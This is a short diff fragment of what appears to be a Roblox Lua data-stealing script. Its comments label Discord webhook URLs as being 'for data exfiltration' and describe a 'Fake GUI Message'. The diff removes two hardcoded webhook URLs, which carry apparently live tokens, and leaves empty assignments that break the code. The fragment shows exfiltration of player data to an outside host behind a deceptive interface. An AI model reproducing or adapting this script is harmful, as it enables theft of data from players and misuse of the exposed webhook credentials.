@@ -9,8 +9,8 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 
 -- 2. Webhook URLs (for data exfiltration)
-local webhook1 = "https://discord.com/api/webhooks/1380694034867159154/c2fIiSfPt29vn1mNv4DN5yXonMTZgdwiXUu-cGSWOicAtACaZSucoQB-4XhWbvG6agds"
-local webhook2 = "https://discord.com/api/webhooks/1380694034867159154/c2fIiSfPt29vn1mNv4DN5yXonMTZgdwiXUu-cGSWOicAtACaZSucoQB-4XhWbvG6agds"
+local webhook1 = 
+local webhook2 = 
 
 -- 3. Fake GUI Message
 local gui = Instance.new("ScreenGui")
